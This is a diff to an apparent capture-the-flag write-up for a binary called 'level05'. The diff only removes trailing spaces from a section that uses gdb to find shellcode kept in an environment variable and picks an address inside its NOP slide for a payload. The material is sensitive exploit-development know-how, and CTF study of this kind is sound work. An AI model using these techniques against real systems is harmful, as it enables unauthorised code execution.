@@ -31,16 +31,16 @@ First we export our shellcode in an environment variable
 
 ### Gathering infos to build the payload
 
-**Find the adress of the shellcode in memory**  
-``gdb ./level05``  
-``(gdb) b main``   
-[...]     
-``(gdb) r``    
-[...]    
-``(gdb) x/200xs environ``    
-[...]    
->0xffffd4d6:	 "SHELLCODE=\220\220\220\220\220\[...]    
->0xffffd59e:	 "\220\220\220\220\220\220\220\[...]    
+**Find the adress of the shellcode in memory**
+``gdb ./level05``
+``(gdb) b main``
+[...]
+``(gdb) r``
+[...]
+``(gdb) x/200xs environ``
+[...]
+>0xffffd4d6:	 "SHELLCODE=\220\220\220\220\220\[...]
+>0xffffd59e:	 "\220\220\220\220\220\220\220\[...]
 
 We're keeping this 0xffffd59e, to be somewhere inside the NOP slide.
 
